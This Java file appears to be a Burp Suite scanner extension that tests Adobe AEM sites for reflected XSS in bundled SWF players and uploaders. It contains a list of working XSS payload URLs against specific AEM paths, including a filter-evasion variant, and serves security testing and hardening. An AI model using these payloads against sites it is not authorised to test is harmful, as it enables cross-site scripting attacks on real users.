package legacy.actions.xss;

import burp.*;
import legacy.BurpHelperDto;
import legacy.Confidence;
import legacy.Severity;
import legacy.actions.AbstractDetector;
import org.apache.commons.lang3.StringUtils;

import java.util.Arrays;
import java.util.Collections;
import java.util.List;

/**
 * Checks for reflected XSS vulnerabilities in AEM hosted SWF files. AEM exposes
 * AEM exposes a number SWF files hat might be vulnerable
 * See - https://speakerdeck.com/fransrosen/a-story-of-the-passive-aggressive-sysadmin-of-aem?slide=61
 * <p>
 * The burp extension is a port of 0ang3el"s hacktivity conference checks.
 * See his presentation and the related aemhackers project
 * https://speakerdeck.com/0ang3el/hunting-for-security-bugs-in-aem-webapps
 * https://github.com/0ang3el
 *
 * @author thomas.hartmann@netcentric.biz
 * @since 02/2019
 */
public class XSSinSWFDetector extends AbstractDetector {

    private static final String ISSUE_NAME = "Reflected XSS vulnerabilities in AEM hosted SWFs";

    private static final String ISSUE_DESCRIPTION =
            "AEM provides a number of based SWF tools such as viewers that might be vulnerable. "
                    + "See - https://speakerdeck.com/fransrosen/a-story-of-the-passive-aggressive-sysadmin-of-aem?slide=61 "
                    + "AEM's Dispatcher must be configured to block the respective paths, to prevent them from beeing delivered.";

    private static final String[] PATHS = new String[] {
            "/etc/clientlibs/foundation/video/swf/player_flv_maxi.swf?onclick=javascript:confirm(document.domain)",
            "/etc/clientlibs/foundation/video/swf/player_flv_maxi.swf?onclick=javascript:confirm`document.domain`",
            "/etc/clientlibs/foundation/video/swf/player_flv_maxi.swf.res?onclick=javascript:confirm(document.domain)",
            "/etc/clientlibs/foundation/video/swf/player_flv_maxi.swf.res?onclick=javascript:confirm`document.domain`",
            "/etc/clientlibs/foundation/shared/endorsed/swf/slideshow.swf?contentPath=%5c\"))%7dcatch(e)%7balert(document.domain)%7d//",
            "/etc/clientlibs/foundation/shared/endorsed/swf/slideshow.swf.res?contentPath=%5c\"))%7dcatch(e)%7balert(document.domain)%7d//",
            "/etc/clientlibs/foundation/video/swf/StrobeMediaPlayback.swf?javascriptCallbackFunction=alert(document.domain)-String",
            "/etc/clientlibs/foundation/video/swf/StrobeMediaPlayback.swf?javascriptCallbackFunction=alertdocument.domain`-String",
            "/etc/clientlibs/foundation/video/swf/StrobeMediaPlayback.swf.res?javascriptCallbackFunction=alert(document.domain)-String",
            "/libs/dam/widgets/resources/swfupload/swfupload_f9.swf?swf?movieName=%22])%7dcatch(e)%7bif(!this.x)alert(document.domain),this.x=1%7d//",
            "/libs/dam/widgets/resources/swfupload/swfupload_f9.swf.res?swf?movieName=%22])%7dcatch(e)%7bif(!this.x)alert(document.domain),this.x=1%7d//",
            "/libs/cq/ui/resources/swfupload/swfupload.swf?movieName=%22])%7dcatch(e)%7bif(!this.x)alert(document.domain),this.x=1%7d//",
            "/libs/cq/ui/resources/swfupload/swfupload.swf.res?movieName=%22])%7dcatch(e)%7bif(!this.x)alert(document.domain),this.x=1%7d//",
            "/etc/dam/viewers/s7sdk/2.11/flash/VideoPlayer.swf?stagesize=1&namespacePrefix=alert(document.domain)-window",
            "/etc/dam/viewers/s7sdk/2.11/flash/VideoPlayer.swf.res?stagesize=1&namespacePrefix=alert(document.domain)-window",
            "/etc/dam/viewers/s7sdk/2.9/flash/VideoPlayer.swf?loglevel=,firebug&movie=%5c%22));if(!self.x)self.x=!alert(document.domain)%7dcatch(e)%7b%7d//",
            "/etc/dam/viewers/s7sdk/2.9/flash/VideoPlayer.swf.res?loglevel=,firebug&movie=%5c%22));if(!self.x)self.x=!alert(document.domain)%7dcatch(e)%7b%7d//",
            "/etc/dam/viewers/s7sdk/3.2/flash/VideoPlayer.swf?stagesize=1&namespacePrefix=window[/aler/.source%2b/t/.source](document.domain)-window",
            "/etc/dam/viewers/s7sdk/3.2/flash/VideoPlayer.swf.res?stagesize=1&namespacePrefix=window[/aler/.source%2b/t/.source](document.domain)-window"
    };

    /**
     * {@link java.lang.reflect.Constructor}
     *
     * @param helperDto
     * @param baseMessage
     */
    public XSSinSWFDetector(BurpHelperDto helperDto, IHttpRequestResponse baseMessage) {
        super(helperDto, baseMessage);
    }

    @Override
    protected boolean issueDetected(final IHttpRequestResponse requestResponse) {
        final IResponseInfo response = getHelpers().analyzeResponse(requestResponse.getResponse());

        getHelperDto().getCallbacks().printOutput("StatusCode: " + response.getStatusCode());
        boolean pass = false;
        for (final String header : response.getHeaders()) {
            // in case of Content-Disposition we fail as it will force us to download and execute the file
            if (StringUtils.startsWith(header, "Content-Disposition:")) {
                return false;
            }

            // if we find the right content type then the XSS will trigger for browser with enabled flash
            if (!pass && StringUtils.startsWith(header, "Content-Type:")
                    && StringUtils.contains(header, "application/x-shockwave-flash")) {
                pass = true;
            }
        }

        return response.getStatusCode() == 200 && pass;
    }

    @Override
    protected List<String> getPaths() {
        return Arrays.asList(PATHS);
    }

    @Override
    protected List<String> getExtensions() {
        return Collections.emptyList();
    }

    @Override
    public String getName() {
        return ISSUE_NAME;
    }

    @Override
    public String getDescription() {
        return ISSUE_DESCRIPTION;
    }

    @Override
    public Severity getSeverity() {
        return Severity.HIGH;
    }

    @Override
    public Confidence getConfidence() {
        return Confidence.CERTAIN;
    }
}
